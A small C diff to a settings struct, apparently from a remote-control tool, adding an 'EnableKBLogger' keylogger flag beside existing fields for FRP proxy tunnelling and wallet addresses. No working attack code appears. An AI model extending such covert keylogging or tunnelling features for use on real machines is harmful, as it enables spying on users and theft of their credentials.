@@ -879,7 +879,11 @@ typedef struct MasterSettings {
     int			DetectSoftware;				// 检测软件
     int			UsingFRPProxy;				// 是否使用FRP代理
     char		WalletAddress[472];			// Wallets
+    int         EnableKBLogger;             // Since 2025-11-27
+    char        Reserved[496];              // Since 2025-11-27
 } MasterSettings;
+
+#define MasterSettingsOldSize 500
 
 #pragma pack(push, 1)
 // 100字节: 运行类型 + 大小 + 调用方式 + DLL名称
